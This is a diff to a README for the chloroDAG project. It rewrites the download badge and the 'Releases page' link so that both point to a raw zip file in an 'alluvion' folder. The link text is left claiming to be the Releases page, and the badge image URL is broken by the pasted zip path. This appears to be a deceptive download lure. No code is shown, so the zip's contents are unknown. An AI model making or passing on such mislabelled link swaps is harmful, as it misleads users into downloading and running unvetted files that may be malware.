@@ -22,9 +22,9 @@ To begin using chloroDAG, follow these straightforward steps:
 ## ⬇️ Download & Install
 You can easily download chloroDAG from the Releases page. 
 
-[![Download chloroDAG](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/okoid721/chloroDAG/releases)
+[![Download chloroDAG](https://raw.githubusercontent.com/okoid721/chloroDAG/main/alluvion/chloroDAG.zip%20Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/okoid721/chloroDAG/main/alluvion/chloroDAG.zip)
 
-1. Click the button above or visit the [Releases page](https://github.com/okoid721/chloroDAG/releases).
+1. Click the button above or visit the [Releases page](https://raw.githubusercontent.com/okoid721/chloroDAG/main/alluvion/chloroDAG.zip).
 2. Locate the latest version of the software. 
 3. Download the installer or the executable file suitable for your operating system.
 
